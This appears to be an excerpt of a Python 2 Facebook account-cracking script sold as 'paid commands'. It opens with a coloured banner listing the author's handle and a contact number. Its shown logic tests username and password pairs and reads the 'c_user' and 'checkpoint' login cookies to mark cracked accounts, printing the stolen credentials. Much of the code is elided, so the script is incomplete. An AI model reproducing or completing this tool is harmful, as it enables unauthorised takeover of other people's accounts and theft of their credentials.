...
logo = """'\x1b[1;92m' d8888b. d8888b. db    db 
'\x1b[1;92m'                88  `8D 88  `8D `8b  d8' 
'\x1b[1;91m'                88oobY' 88   88  `8bd8'  
'\x1b[1;97m'                88`8b   88   88  .dPYb.  
'\x1b[1;93m'                88 `88. 88  .8D .8P  Y8. 
'\x1b[1;94m'                88   YD Y8888D' YP    YP 

'\x1b[1;91m'   Author      :        
'\x1b[1;92m'   Github      :     RDX-DARDX  
'\x1b[1;93m'   FB ID       :     RDX-DARDX  
'\x1b[1;94m'   TOOL TYPE   :     PAID COMMANDS
'\x1b[1;96m'   WAP NUMBER  :     01797870616            
"""
dec="2"
server="2"
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print "\x1b[1;92m[RDX-OK] "+coc+user + " | " + pass1
                ...
                if 'checkpoint' in rana.cookies.get_dict().keys():
                    ...
                    print "\x1b[1;91m[RDX-CP] "+coc+user + " | " + pass1
